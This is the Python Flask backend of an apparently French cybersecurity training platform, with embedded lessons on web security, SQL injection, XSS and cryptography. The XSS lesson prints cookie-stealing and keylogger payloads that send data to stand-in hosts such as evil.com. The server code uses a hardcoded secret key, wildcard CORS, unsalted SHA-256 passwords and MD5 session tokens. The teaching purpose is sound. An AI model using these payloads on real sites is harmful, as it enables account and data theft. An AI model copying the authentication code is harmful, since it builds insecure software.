from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import json
import os
from datetime import datetime
import hashlib
import secrets
import hashlib
from game_rooms import room_manager

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cyberforge-secret-key-2024'
# CORS pour permettre les connexions depuis n'importe quel PC du réseau local
CORS(app, origins="*", supports_credentials=True)

# Initialiser SocketIO avec CORS (sans eventlet pour Python 3.13)
socketio = SocketIO(
    app, 
    cors_allowed_origins="*",  # Accepter toutes les origines sur le réseau local
    async_mode='threading'
)

# Simulated database (in production, use a real database)
users_db = {}
sessions_db = {}

# Helper function to hash passwords
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# Helper function to generate session token
def generate_session_token(username):
    token = hashlib.md5(f"{username}{datetime.now()}".encode()).hexdigest()
    sessions_db[token] = username
    return token

@app.route('/')
def home():
    return jsonify({
        "message": "CyberForge Backend is Running!",
        "status": "success",
        "version": "1.0.0"
    })

@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        username = data.get('username')
        email = data.get('email')
        password = data.get('password')
        
        if not username or not email or not password:
            return jsonify({"error": "Missing required fields"}), 400
        
        if username in users_db:
            return jsonify({"error": "Username already exists"}), 409
        
        # Generate unique user ID
        user_id = f"user_{len(users_db)}_{username}"
        
        # Store user (in production, use proper database)
        users_db[username] = {
            "id": user_id,
            "email": email,
            "password": hash_password(password),
            "created_at": datetime.now().isoformat(),
            "progress": {},
            "level": 1,
            "experience": 0
        }
        
        # Générer un token de session automatiquement pour connexion directe
        token = generate_session_token(username)
        
        return jsonify({
            "message": "User created successfully",
            "username": username,
            "userId": user_id,
            "token": token,
            "user": {
                "username": username,
                "email": email,
                "level": 1,
                "experience": 0
            }
        }), 201
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        if not username or not password:
            return jsonify({"error": "Missing username or password"}), 400
        
        if username not in users_db:
            return jsonify({"error": "Invalid credentials"}), 401
        
        if users_db[username]["password"] != hash_password(password):
            return jsonify({"error": "Invalid credentials"}), 401
        
        # Generate session token
        token = generate_session_token(username)
        
        return jsonify({
            "message": "Login successful",
            "token": token,
            "user": {
                "username": username,
                "email": users_db[username]["email"],
                "level": users_db[username]["level"],
                "experience": users_db[username]["experience"]
            }
        }), 200
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Module data
modules_data = {
    "web_security": {
        "id": "web_security",
        "title": "Sécurité Web",
        "description": "Apprenez les bases de la sécurité web et les vulnérabilités communes",
        "icon": "🌐",
        "difficulty": "Débutant",
        "duration": "45 min",
        "lessons": [
            {
                "id": 1,
                "title": "Introduction à la sécurité web",
                "content": """
# Introduction à la Sécurité Web

La sécurité web représente l'ensemble des mesures et pratiques mises en place pour protéger les applications web, les serveurs et les données qu'ils traitent contre diverses menaces cybernétiques. Dans notre monde de plus en plus connecté, où les entreprises dépendent massivement de leurs infrastructures numériques, maîtriser ces concepts devient essentiel pour tout professionnel de l'informatique.

## 🌐 Évolution du paysage des menaces

### L'explosion du web moderne et sa complexification
Depuis les années 2000, nous avons assisté à une transformation radicale du web qui a fondamentalement changé le paysage de la sécurité informatique. Cette évolution représente à la fois des opportunités extraordinaires et des défis sécuritaires majeurs.

**Transformation architecturale :**
Le passage des sites web statiques aux applications web dynamiques a créé une surface d'attaque exponentiellement plus large. Là où nous avions autrefois de simples pages HTML servies par des serveurs web basiques, nous avons maintenant des écosystèmes complexes intégrant :

- **Technologies frontend modernes** : React, Angular, Vue.js permettent des interfaces utilisateur riches avec interactions temps réel, WebSockets, et APIs JavaScript nombreuses. Chaque bibliothèque introduit ses propres vulnérabilités potentielles.

- **APIs REST et GraphQL** : La communication entre services distribués expose de multiples endpoints d'API, chacun représentant un point d'entrée potentiel pour les attaquants. Les API GraphQL, bien qu'efficaces, introduisent des risques spécifiques comme les attaques par requêtes complexes.

- **Architecture microservices** : La décomposition des monolithes en microservices distribués augmente considérablement la surface d'attaque. Chaque service peut avoir ses propres vulnérabilités, et la communication inter-services crée de nouveaux vecteurs d'attaque.

- **Cloud computing et conteneurisation** : Le déplacement vers AWS, Azure, GCP et l'adoption de Docker/Kubernetes introduisent des modèles de sécurité partagée où la responsabilité est répartie entre fournisseur et client.

- **IoT et écosystème mobile** : L'explosion des objets connectés (50 milliards d'appareils IoT prévus en 2030) et des applications mobiles multiplie les points d'entrée dans les systèmes d'information.

### Impact économique et social des cyberattaques

**Statistiques alarmantes 2023-2024 :**
Les dernières études révèlent l'ampleur critique du défi cybersécurité :

- **Coût moyen d'une violation de données** : 4.45 millions USD (IBM Security Report 2023)
- **Temps de détection moyen** : 287 jours pour identifier une intrusion
- **Temps de confinement moyen** : 80 jours supplémentaires pour éliminer la menace
- **93% des attaques réussies** exploitent des vulnérabilités web connues depuis plus de 2 ans
- **1 entreprise sur 3** subit une attaque majeure chaque année
- **Croissance des ransomwares** : +41% en 2023 avec un coût moyen de 5.13 millions USD

**Secteurs les plus touchés :**
1. **Santé** : 10.93 millions USD de coût moyen (dossiers médicaux sensibles)
2. **Services financiers** : 5.9 millions USD (données bancaires critiques)
3. **Énergie** : 5.05 millions USD (infrastructures critiques)
4. **Technologie** : 4.97 millions USD (propriété intellectuelle)
5. **Éducation** : 3.65 millions USD (données étudiantes et recherche)

### Évolution des techniques d'attaque

**Sophistication croissante des menaces :**

**APT (Advanced Persistent Threats) :**
Les groupes d'attaquants étatiques et criminels développent des campagnes multi-étapes sur plusieurs mois :
- **Lazarus Group** (Corée du Nord) : Attaques financières de plusieurs millions
- **APT29/Cozy Bear** (Russie) : Espionnage gouvernemental et technologique
- **APT1/Comment Crew** (Chine) : Vol de propriété intellectuelle industrielle

**Supply Chain Attacks (Attaques de la chaîne logicielle) :**
- **SolarWinds (2020)** : 18,000 organisations compromises via une mise à jour logicielle
- **Kaseya (2021)** : 1,500 entreprises affectées par ransomware via MSP
- **CodeCov (2021)** : Outils de développement compromis affectant des milliers de projets

**Living Off The Land (LotL) :**
Utilisation d'outils légitimes du système pour les attaques :
- PowerShell, WMI, certutil sur Windows
- bash, curl, ssh sur Linux
- Scripts Python et JavaScript natifs

### Nouveaux vecteurs d'attaque émergents

**Cloud Security Challenges :**
- **Misconfiguration** : 68% des incidents cloud dus à des erreurs de configuration
- **Identity and Access Management** : Compromission de comptes cloud privilégiés
- **Container Security** : Vulnérabilités dans Docker, Kubernetes
- **Serverless Security** : Nouveaux défis avec AWS Lambda, Azure Functions

**AI et Machine Learning Security :**
- **Model Poisoning** : Corruption des données d'entraînement IA
- **Adversarial Attacks** : Manipulation des inputs pour tromper les modèles
- **Data Privacy** : Extraction d'informations sensibles des modèles ML

**5G et Edge Computing :**
- **Network Slicing Security** : Isolation des tranches réseau 5G
- **Edge Device Security** : Sécurisation des dispositifs en périphérie
- **Latency-Critical Security** : Sécurité temps réel pour applications critiques

### Réglementation et compliance en évolution

**RGPD et évolutions :**
- Amendes record : 1.2 milliards EUR pour Meta (2023)
- Extension géographique : Effet extraterritorial mondial
- Nouveaux droits : Droit à la portabilité, droit à l'oubli

**Cybersecurity Act (EU) :**
- Certification obligatoire pour produits IoT
- Standards de cybersécurité harmonisés
- Sanctions renforcées pour non-conformité

**Executive Order 14028 (US) :**
- Zero Trust Architecture obligatoire pour agences fédérales
- Software Bill of Materials (SBOM) requis
- Incident reporting mandataire sous 72h

Cette transformation continue du paysage numérique nécessite une adaptation permanente des stratégies de sécurité et une formation continue des professionnels.

## 🔐 Concepts fondamentaux de sécurité

### 1. La triade CIA (Confidentialité, Intégrité, Disponibilité)

**Confidentialité** : Garantir que seules les personnes autorisées accèdent aux informations
- Chiffrement des données en transit (HTTPS/TLS)
- Chiffrement des données au repos (AES, bases de données chiffrées)
- Contrôle d'accès granulaire (RBAC, ABAC)
- Anonymisation et pseudonymisation des données personnelles

**Intégrité** : Assurer que les données ne sont pas altérées de manière non autorisée
- Signatures numériques et certificats
- Hachage cryptographique (SHA-256, SHA-3)
- Contrôles de somme et checksums
- Journalisation des modifications (audit trails)

**Disponibilité** : Maintenir l'accès aux services pour les utilisateurs légitimes
- Redondance et haute disponibilité
- Protection contre les attaques DDoS
- Plans de continuité d'activité
- Monitoring et alertes temps réel

### 2. Authentification vs Autorisation - Approfondissement

**Authentification multifacteur (MFA)**
- **Facteur 1** : Quelque chose que vous savez (mot de passe)
- **Facteur 2** : Quelque chose que vous avez (smartphone, token)
- **Facteur 3** : Quelque chose que vous êtes (biométrie)

**Protocoles modernes d'authentification**
- **OAuth 2.0** : Délégation d'autorisation sécurisée
- **OpenID Connect** : Couche d'identité sur OAuth 2.0
- **SAML** : Échange d'informations d'authentification
- **JWT** : Tokens compacts pour les APIs

### 3. OWASP Top 10 - Analyse détaillée

**A01:2021 - Broken Access Control (Nouveau #1)**
Cette catégorie grimpe de la 5ème à la 1ère place. Elle inclut :
- Violation du principe de privilège minimum
- Contournement des contrôles d'accès par modification d'URL
- Accès non autorisé aux APIs
- Élévation de privilèges (agir en tant qu'admin sans autorisation)

**A02:2021 - Cryptographic Failures**
Anciennement "Sensitive Data Exposure", cette catégorie couvre :
- Transmission de données en clair (HTTP au lieu de HTTPS)
- Utilisation d'algorithmes cryptographiques obsolètes (MD5, SHA-1, DES)
- Stockage de mots de passe en clair ou avec des hachages faibles
- Absence de validation de certificats

**A03:2021 - Injection**
Toujours dans le top 3, incluant :
- SQL Injection (union-based, blind, time-based)
- NoSQL Injection (MongoDB, CouchDB)
- LDAP Injection
- OS Command Injection
- Code Injection (PHP, Python, etc.)

### 4. Architecture de sécurité moderne

**Principe de Zero Trust**
- "Ne jamais faire confiance, toujours vérifier"
- Vérification continue de l'identité et des autorisations
- Microsegmentation du réseau
- Chiffrement end-to-end

**Security by Design**
- Intégration de la sécurité dès la conception
- Threat modeling et analyse de risques
- Secure coding practices
- Tests de sécurité automatisés (SAST, DAST)

**Défense en profondeur (Defense in Depth)**
```
Internet → WAF → Load Balancer → Web Server → App Server → Database
    ↓         ↓          ↓           ↓           ↓          ↓
  Firewall  IDS/IPS   SSL/TLS    Input Valid.  RBAC    Encryption
```

## 🛡️ Technologies et outils essentiels

### Web Application Firewalls (WAF)
- **ModSecurity** : WAF open-source avec règles OWASP
- **Cloudflare** : Protection distribuée contre les attaques
- **AWS WAF** : Service managé intégré à l'infrastructure cloud
- **F5 BIG-IP** : Solution entreprise avec IA pour détection d'anomalies

### Outils de scanning et d'audit
- **OWASP ZAP** : Proxy d'interception et scanner automatisé
- **Burp Suite** : Plateforme complète de tests d'intrusion web
- **Nikto** : Scanner de vulnérabilités web en ligne de commande
- **Nessus** : Scanner commercial avec base de données CVE étendue

### Frameworks de développement sécurisé
- **Spring Security** (Java) : Authentification et autorisation robustes
- **Django Security** (Python) : Protection CSRF, XSS intégrée
- **Helmet.js** (Node.js) : Headers de sécurité automatiques
- **OWASP ESAPI** : Bibliothèque de sécurité multi-langages

## 📊 Métriques et indicateurs de sécurité

### KPIs de sécurité web
- **MTTD** (Mean Time To Detect) : Temps moyen de détection
- **MTTR** (Mean Time To Respond) : Temps moyen de réponse
- **Vulnerability Density** : Nombre de vulnérabilités par ligne de code
- **Security Test Coverage** : Pourcentage de code testé pour la sécurité

### Compliance et standards
- **PCI DSS** : Standard pour le traitement des cartes de paiement
- **GDPR/RGPD** : Protection des données personnelles en Europe
- **ISO 27001** : Système de management de la sécurité
- **SOX** : Loi américaine sur la transparence financière
"""
            },
            {
                "id": 2,
                "title": "Injection SQL - Comprendre et prévenir",
                "content": """
# Injection SQL - La vulnérabilité n°1

L'injection SQL reste la vulnérabilité web la plus critique selon l'OWASP Top 10. Elle permet aux attaquants d'exécuter du code SQL arbitraire sur votre base de données.

## 🎯 Comment fonctionne une injection SQL ?

### Exemple concret d'attaque :
```sql
-- Requête normale d'authentification
SELECT * FROM users WHERE username = 'admin' AND password = 'motdepasse';

-- Injection malveillante dans le champ username
Username: admin'; DROP TABLE users; --
Password: anything

-- Requête résultante (DANGEREUSE!)
SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --' AND password = 'anything';
```

### Types d'injections courantes :
1. **Union-based** : Récupérer des données d'autres tables
2. **Boolean-based** : Extraire des informations via des tests vrai/faux
3. **Time-based** : Utiliser des délais pour extraire des données
4. **Error-based** : Exploiter les messages d'erreur

## 🛡️ Techniques de prévention avancées

### 1. Requêtes préparées (Prepared Statements)
```python
# ✅ SÉCURISÉ - Utilisation de paramètres
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s", 
    (username, hashed_password)
)

# ❌ VULNÉRABLE - Concaténation de chaînes
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

### 2. Procédures stockées sécurisées
```sql
DELIMITER //
CREATE PROCEDURE GetUser(IN username VARCHAR(50))
BEGIN
    SELECT * FROM users WHERE username = username;
END //
DELIMITER ;
```

### 3. Validation et filtrage strict
- **Whitelist** : Autoriser uniquement les caractères attendus
- **Longueur** : Limiter la taille des entrées
- **Type** : Vérifier le type de données
- **Échappement** : Neutraliser les caractères spéciaux

### 4. Principe du moindre privilège
- Comptes base de données dédiés avec droits minimaux
- Jamais de connexion admin pour l'application
- Séparation des environnements (dev/test/prod)

### 5. Détection et monitoring
- Logs d'accès et d'erreurs détaillés
- Alertes sur les tentatives d'injection
- WAF (Web Application Firewall)
- Tests de sécurité automatisés

## ⚡ Outils de test et détection

### Outils automatisés :
- **SQLMap** : Scanner d'injection SQL
- **Burp Suite** : Proxy d'interception
- **OWASP ZAP** : Scanner de vulnérabilités
- **Nessus** : Scanner réseau et web

### Tests manuels :
- Injection de caractères spéciaux (' " ; --)
- Tentatives d'union (UNION SELECT)
- Tests de délais (WAITFOR DELAY)
- Extraction de métadonnées

## 📊 Impact et statistiques

- **92%** des applications web testées sont vulnérables
- **Coût moyen** d'une faille SQL : 3.8M€
- **Temps de découverte** moyen : 196 jours
- **CVSS Score** : Généralement 8.0-10.0 (Critique)
"""
            },
            {
                "id": 3,
                "title": "Cross-Site Scripting (XSS) - Attaques et défenses",
                "content": """
# Cross-Site Scripting (XSS)

XSS permet d'injecter du code JavaScript malveillant dans des pages web, affectant les utilisateurs qui visitent ces pages.

## 🎯 Types de XSS

### 1. XSS Réfléchi (Reflected)
```html
<!-- URL malveillante -->
https://site.com/search?q=<script>alert('XSS')</script>

<!-- Page affiche directement le paramètre -->
<div>Résultats pour : <script>alert('XSS')</script></div>
```

### 2. XSS Stocké (Stored) 
```html
<!-- Commentaire malveillant stocké en base -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

### 3. XSS DOM
```javascript
// Code JavaScript vulnérable
document.getElementById('output').innerHTML = location.hash;

// URL d'attaque
https://site.com/page.html#<img src=x onerror=alert('XSS')>
```

## 🛡️ Méthodes de prévention

### 1. Encodage contextuel
```javascript
// Encodage HTML
function escapeHtml(text) {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#x27;");
}
```

### 2. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'">
```

### 3. Validation côté serveur
```python
import re

def sanitize_input(user_input):
    # Supprimer les balises script
    pattern = re.compile(r'<script.*?</script>', re.IGNORECASE | re.DOTALL)
    return pattern.sub('', user_input)
```

### 4. Bibliothèques de sécurité
- **DOMPurify** (JavaScript)
- **OWASP Java Encoder**
- **AntiXSS Library** (.NET)
- **Bleach** (Python)

## ⚡ Techniques d'exploitation avancées

### Bypass de filtres :
```javascript
// Contournement de filtres basiques
<img src=javascript:alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="data:text/html,<script>alert('XSS')</script>">
```

### Vol de cookies :
```javascript
new Image().src = 'http://evil.com/steal.php?c=' + document.cookie;
```

### Keylogger JavaScript :
```javascript
document.onkeypress = function(e) {
    new Image().src = 'http://evil.com/log.php?key=' + String.fromCharCode(e.which);
}
```
"""
            }
        ]
    },
    "cryptography": {
        "id": "cryptography",
        "title": "Cryptographie",
        "description": "Maîtrisez les concepts fondamentaux de la cryptographie moderne",
        "icon": "🔐",
        "difficulty": "Intermédiaire",
        "duration": "60 min",
        "lessons": [
            {
                "id": 1,
                "title": "Fondements mathématiques de la cryptographie",
                "content": """
# Fondements mathématiques de la cryptographie

La cryptographie moderne repose sur des bases mathématiques solides. Comprendre ces concepts est essentiel pour maîtriser les algorithmes de chiffrement et leurs applications pratiques.

## 🔢 Arithmétique modulaire - Le cœur de la crypto

### Concepts fondamentaux
L'arithmétique modulaire est omniprésente en cryptographie. Elle permet de travailler avec des nombres dans un espace fini.

**Définition formelle :**
```
a ≡ b (mod n) signifie que a et b ont le même reste quand divisés par n
```

**Exemples pratiques :**
- 17 ≡ 2 (mod 5) car 17 = 3×5 + 2 et 2 = 0×5 + 2
- 100 ≡ 4 (mod 8) car 100 = 12×8 + 4

### Applications cryptographiques
- **RSA** : Utilise l'arithmétique modulo n = p×q
- **Diffie-Hellman** : Basé sur l'exponentiation modulaire
- **AES** : Operations dans GF(2^8) - corps de Galois

## 🔐 Cryptographie symétrique moderne

### Architecture des chiffrements par blocs

**Structure de Feistel (DES legacy) :**
```
Texte clair (64 bits)
    ↓
Permutation initiale
    ↓
16 tours de Feistel
    ↓
Permutation finale
    ↓
Texte chiffré (64 bits)
```

**Réseau de substitution-permutation (AES) :**
```
État initial (128 bits)
    ↓
SubBytes (substitution)
    ↓
ShiftRows (permutation)
    ↓
MixColumns (diffusion)
    ↓
AddRoundKey (XOR avec clé)
    ↓
Répéter 10/12/14 tours selon la taille de clé
```

### AES - Advanced Encryption Standard

**Détails techniques :**
- **Tailles de clé** : 128, 192, 256 bits
- **Taille de bloc** : 128 bits fixe
- **Tours** : 10 (128-bit), 12 (192-bit), 14 (256-bit)
- **Résistance** : Aucune attaque pratique connue

**Modes opératoires critiques :**
```
ECB (Electronic Codebook) - ❌ DANGEREUX
└─ Patterns visibles, même texte → même chiffré

CBC (Cipher Block Chaining) - ✅ Standard
└─ C[i] = E(P[i] ⊕ C[i-1]) avec IV aléatoire

GCM (Galois/Counter Mode) - ✅ Recommandé
└─ Chiffrement + authentification intégrée
```

### Gestion des clés - Le défi central

**Dérivation de clés (KDF) :**
```python
# PBKDF2 - Standard industriel
import hashlib
import os

def pbkdf2_sha256(password, salt, iterations=100000):
    return hashlib.pbkdf2_hmac('sha256', password, salt, iterations)

# Exemple d'usage sécurisé
password = "user_password".encode()
salt = os.urandom(32)  # 256 bits de sel aléatoire
derived_key = pbkdf2_sha256(password, salt, 100000)
```

**Hiérarchie de clés d'entreprise :**
```
Clé maîtresse (HSM sécurisé)
    ↓
Clés d'environnement (Prod/Test/Dev)
    ↓
Clés d'application (par service)
    ↓
Clés de session (temporaires)
```

## 🔑 Cryptographie asymétrique - La révolution

### RSA - Rivest-Shamir-Adleman

**Principe mathématique :**
Basé sur la difficulté de factoriser de grands nombres semi-premiers.

**Génération de clés :**
```
1. Choisir p, q premiers (1024+ bits chacun)
2. Calculer n = p × q
3. Calculer φ(n) = (p-1)(q-1)
4. Choisir e tel que gcd(e, φ(n)) = 1 (souvent 65537)
5. Calculer d ≡ e^(-1) (mod φ(n))

Clé publique : (n, e)
Clé privée : (n, d)
```

**Limites et vulnérabilités :**
- **Taille de clé** : Minimum 2048 bits recommandé (2023)
- **Attaques** : Factorisation, timing attacks, fault attacks
- **Quantum** : Vulnérable à l'algorithme de Shor

### Cryptographie sur courbes elliptiques (ECC)

**Avantages mathématiques :**
- **Efficacité** : 256-bit ECC ≡ 3072-bit RSA en sécurité
- **Performance** : Calculs plus rapides
- **Économie** : Moins de bande passante et stockage

**Courbes standardisées :**
```
NIST P-256 (secp256r1) - Largement supporté
Curve25519 - Optimisé pour la performance
Ed25519 - Signatures numériques rapides
SECP256K1 - Bitcoin et blockchain
```

### Échange de clés Diffie-Hellman

**Protocole classique :**
```
Alice choisit a (privé), calcule A = g^a mod p (public)
Bob choisit b (privé), calcule B = g^b mod p (public)

Échange de A et B

Alice calcule : s = B^a mod p
Bob calcule : s = A^b mod p
└─ s identique = clé partagée secrète
```

**Variante moderne ECDH :**
Plus efficace, utilise les courbes elliptiques pour l'échange.

## 🛡️ Fonctions de hachage cryptographiques

### Propriétés essentielles

**Résistance aux collisions :**
- **Faible** : Difficile de trouver x tel que H(x) = h donné
- **Forte** : Difficile de trouver x,y tels que H(x) = H(y)

**Effet avalanche :**
Changement d'un bit → modification de ~50% des bits de sortie

### SHA-3 - La nouvelle génération

**Construction Keccak :**
```
Absorption → Permutation → Compression → Essorage

Sponge Construction:
- Absorber l'entrée par blocs
- Appliquer fonction de permutation f
- Extraire la sortie désirée
```

**Avantages sur SHA-2 :**
- Structure différente (pas Merkle-Damgård)
- Résistant aux attaques par extension de longueur
- Flexibilité dans les tailles de sortie

## 🔒 Applications pratiques modernes

### TLS/SSL - Sécurisation des communications

**Handshake TLS 1.3 simplifié :**
```
Client → ServerHello + Certificate + Finished
Server → Certificate + Finished

Négociation :
- Version TLS
- Suite cryptographique
- Certificats X.509
- Clés de session éphémères
```

**Suites cryptographiques recommandées 2024 :**
```
TLS_AES_256_GCM_SHA384 - AES-256 + authentification
TLS_CHACHA20_POLY1305_SHA256 - Alternative mobile
TLS_AES_128_GCM_SHA256 - Performance optimisée
```

### Blockchain et signatures numériques

**ECDSA pour Bitcoin :**
```python
# Signature simplifiée
def sign_transaction(private_key, transaction_hash):
    # k doit être aléatoire et unique pour chaque signature
    k = generate_random_nonce()
    r = (k * G).x % n
    s = (private_key * transaction_hash + k * r) * modinv(k, n) % n
    return (r, s)
```

**Problèmes de sécurité courants :**
- Réutilisation de nonce k → récupération clé privée
- Faible entropie → attaques par force brute
- Side-channel attacks → fuites timing

### Cryptographie post-quantique

**Enjeux de l'informatique quantique :**
- **Algorithme de Shor** : Factorisation polynomiale
- **Grover** : Recherche dans base non-structurée (√n)
- **Impact** : RSA, ECDSA obsolètes

**Alternatives en développement :**
```
Kyber - Échange de clés (lattices)
Dilithium - Signatures (lattices)  
SPHINCS+ - Signatures (hash-based)
BIKE - Chiffrement (codes correcteurs)
```

## 📊 Métriques de sécurité

### Estimation de la force cryptographique

**Équivalences sécuritaires (bits de sécurité) :**
```
RSA-1024    → ~80 bits  (CASSÉ)
RSA-2048    → ~112 bits (minimum actuel)
RSA-3072    → ~128 bits (recommandé 2030+)
ECC P-256   → ~128 bits
AES-128     → 128 bits
SHA-256     → 128 bits (collision), 256 bits (préimage)
```

Cette base solide vous prépare aux défis cryptographiques modernes !
"""
            },
            {
                "id": 2,
                "title": "Implémentation sécurisée et attaques pratiques",
                "content": """
# Implémentation sécurisée et attaques pratiques

Même les algorithmes cryptographiques les plus robustes peuvent être vulnérables si mal implémentés. Cette section explore les pièges courants et les bonnes pratiques.

## ⚠️ Vulnérabilités d'implémentation communes

### Attaques par canaux auxiliaires (Side-Channel)

**Timing attacks - Le fléau du développeur :**
```python
# ❌ VULNÉRABLE - Comparaison variable dans le temps
def verify_hmac_vulnerable(message, signature, secret):
    expected = hmac.new(secret, message, hashlib.sha256).hexdigest()
    # Arrêt dès la première différence = timing leak
    return signature == expected

# ✅ SÉCURISÉ - Comparaison à temps constant
def verify_hmac_secure(message, signature, secret):
    expected = hmac.new(secret, message, hashlib.sha256).hexdigest()
    # Comparaison de tous les bytes, même en cas de différence
    return hmac.compare_digest(signature, expected)
```

**Analyse de consommation (Power Analysis) :**
Les variations de consommation électrique révèlent les opérations :
- **Simple Power Analysis (SPA)** : Observation directe
- **Differential Power Analysis (DPA)** : Analyse statistique
- **Correlation Power Analysis (CPA)** : Modèle de fuite

**Contremesures matérielles :**
- Masquage algorithmique (Boolean/Arithmetic masking)
- Randomisation temporelle
- Dual-rail logic pour consommation constante

### Attaques par fautes (Fault Injection)

**Principes d'exploitation :**
```
Injection laser → Modification bit registre → Calcul erroné → Fuite cryptographique
```

**Exemple RSA-CRT fault attack :**
```python
# Si une seule signature mod p ou mod q est fautée
# L'attaquant peut factoriser n et récupérer la clé privée
def exploit_rsa_crt_fault(n, message, correct_sig, faulty_sig):
    diff = correct_sig - faulty_sig
    # Si fault sur p : gcd(diff, n) révèle p
    p = math.gcd(diff, n)
    if 1 < p < n:
        q = n // p
        return (p, q)  # Clé privée compromise !
```

## 🔐 Générateurs de nombres aléatoires

### Entropie - La source de toute sécurité

**Sources d'entropie système :**
```python
import secrets  # Python 3.6+ - CSPRNG sécurisé

# ✅ CORRECT - Sources système sécurisées
secure_key = secrets.token_bytes(32)  # 256 bits
secure_int = secrets.randbelow(1000)

# ❌ DANGEREUX - Générateur pseudoaléatoire prévisible
import random
weak_key = random.getrandbits(256)  # PRÉVISIBLE !
```

**Entropie insuffisante - Cas réels :**
- **Debian OpenSSL (2008)** : PRNG mal seedé → clés SSH prévisibles
- **Android Bitcoin (2013)** : Faible entropie → vol de bitcoins
- **IoT devices** : Pas d'entropie hardware → clés identiques

### Tests statistiques de qualité

**Suite NIST SP 800-22 :**
```
Frequency test - Distribution des 0 et 1
Runs test - Séquences de bits identiques
Matrix rank - Indépendance linéaire
Spectral test - Périodicité cachée
```

### HSM (Hardware Security Modules)

**Avantages des HSM :**
- Génération d'entropie vraie (bruit thermique, quantum)
- Protection physique (tamper-evident/resistant)
- Certification Common Criteria (EAL 4+)
- Performance cryptographique optimisée

## 🛡️ Protocoles cryptographiques robustes

### Authentification mutuelle forte

**Protocol Station-to-Station (STS) :**
```
Alice → Bob : g^a
Bob → Alice : g^b, Sign_B(g^b, g^a)
Alice → Bob : Sign_A(g^a, g^b)

Clé partagée : K = g^(ab)
Authentification : Signatures croisées
```

### Forward Secrecy (Confidentialité Persistante)

**Signal Protocol - Référence industrie :**
```
Double Ratchet Algorithm:
- DH Ratchet : Nouvelle paire de clés à chaque message
- KDF Ratchet : Dérivation de clés chaînée

Message Key = KDF(Chain Key, Constant)
Chain Key = KDF(Chain Key, 0x01)
```

**Avantages opérationnels :**
- Compromission clé → Pas d'impact historique
- Self-healing : Récupération automatique
- Asynchrone : Pas de synchronisation requise

## 🔍 Cryptanalyse moderne

### Attaques algébriques

**Exemple AES réduit :**
```python
# Modélisation en équations polynomiales sur GF(2)
# S-Box AES → 39 équations quadratiques en 16 variables
# Résolution par bases de Gröbner (complexité exponentielle)

def aes_algebraic_model(plaintext, key, rounds=10):
    equations = []
    variables = generate_state_variables(rounds)
    
    # Contraintes SubBytes
    for r in range(rounds):
        equations.extend(sbox_constraints(variables[r]))
    
    # Contraintes ShiftRows, MixColumns, AddRoundKey
    # ... 
    
    return solve_polynomial_system(equations)
```

### Cryptanalyse différentielle

**Principe fondamental :**
```
P1 ⊕ P2 = ΔP → C1 ⊕ C2 = ΔC avec probabilité p

Objectif : Trouver des différentielles de haute probabilité
pour récupérer des informations sur la clé
```

### Linear Cryptanalysis

**Attack de Matsui sur DES :**
```
Approximations linéaires :
P[i1,i2,...] ⊕ C[j1,j2,...] ⊕ K[k1,k2,...] = 0 avec biais ε

Complexité : O(ε^(-2)) textes clairs connus
```

## 🏭 Cryptographie en production

### Lifecycle Management des clés

**NIST SP 800-57 - Recommandations :**
```
Génération → Distribution → Utilisation → Archivage → Destruction

Périodes cryptographiques :
- Clés de chiffrement : 2 ans maximum
- Clés de signature : 3 ans maximum  
- Clés racines CA : 10-20 ans
```

### API Cryptographiques sécurisées

**PKCS#11 - Standard industrie :**
```c
// Interface uniforme pour HSM/Smart cards
CK_RV C_EncryptInit(CK_SESSION_HANDLE hSession,
                    CK_MECHANISM_PTR pMechanism,
                    CK_OBJECT_HANDLE hKey);

// Mécanismes supportés
CKM_AES_GCM, CKM_RSA_OAEP, CKM_ECDSA_SHA256
```

**Azure Key Vault / AWS KMS :**
```python
# Chiffrement côté cloud avec clés managées
from azure.keyvault.keys.crypto import CryptographyClient

crypto_client = CryptographyClient(key, credential)
result = crypto_client.encrypt("RSA-OAEP", plaintext)
```

### Performance et optimisation

**Benchmarks AES (Intel i7, single-core) :**
```
AES-128-CBC : ~1.2 GB/s (software)
AES-128-GCM : ~800 MB/s (software)
AES-NI      : ~3.5 GB/s (hardware acceleration)
ChaCha20    : ~950 MB/s (software optimized)
```

**Optimisations assembleur critiques :**
- Utilisation instructions AES-NI (Intel/AMD)
- SIMD pour opérations parallèles
- Cache timing mitigation
- Constant-time implementations

## 📡 Cryptographie quantique

### Distribution quantique de clés (QKD)

**Protocole BB84 :**
```
Alice encode qubits : |0⟩, |1⟩, |+⟩, |−⟩
Bob mesure aléatoirement : base Z ou base X
Comparaison publique → Clé secrète

Sécurité : Principe d'incertitude quantique
Écoute → Perturbation détectable
```

### Limites pratiques actuelles

**Défis techniques :**
- Distance limitée (quelques centaines de km)
- Débit faible (kbits/s)
- Infrastructure coûteuse
- Vulnérabilités d'implémentation

## 🔮 Perspectives d'évolution

### Cryptographie homomorphe

**Calcul sur données chiffrées :**
```python
# Conceptuel - Encore expérimental
encrypted_a = encrypt(42)
encrypted_b = encrypt(17)
encrypted_result = homomorphic_add(encrypted_a, encrypted_b)
result = decrypt(encrypted_result)  # = 59
```

### Zero-Knowledge Proofs

**Applications émergentes :**
- Authentification sans révéler le secret
- Blockchain privacy (Zcash, Monero)
- Compliance sans exposition de données

Maîtriser ces concepts vous place au cœur de la révolution cryptographique !
"""
            }
        ]
    },
    "ethical_hacking": {
        "id": "ethical_hacking",
        "title": "Hacking Éthique",
        "description": "Apprenez les techniques de test de pénétration légales",
        "icon": "🎯",
        "difficulty": "Avancé",
        "duration": "75 min",
        "lessons": [
            {
                "id": 1,
